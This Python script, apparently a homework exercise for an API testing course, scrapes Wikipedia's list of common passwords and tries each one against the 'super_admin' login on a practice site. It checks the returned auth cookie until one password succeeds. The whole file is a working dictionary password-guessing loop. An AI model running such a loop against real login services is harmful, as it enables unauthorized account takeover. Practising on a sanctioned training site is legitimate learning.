import requests
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions
from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
options = Options()
options.add_argument("headless")
browser = webdriver.Chrome(options=options)
wiki_url = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords"
metod1_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
metod2_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
tru_login = 'super_admin'
wrong_cookie_answer = "You are NOT authorized"
browser.get(wiki_url)
WebDriverWait(browser, 5).until(expected_conditions.visibility_of_element_located((By.CSS_SELECTOR,
                                                                                   ".mw-headline#SplashData")))
passwords = browser.find_elements(By.CSS_SELECTOR, "[align='left']")
for password in passwords[:225]:
    data = {'login': tru_login, 'password': password.text}
    response1 = requests.request('POST', metod1_url, data=data)
    cookie_value = response1.cookies.get('auth_cookie')
    cookies ={'auth_cookie': cookie_value}
    response2 = requests.request('POST', metod2_url, cookies=cookies)
    if response2.text != wrong_cookie_answer:
        print(f"{response2.text}, верный пароль:  {password.text}")
        break
browser.quit()
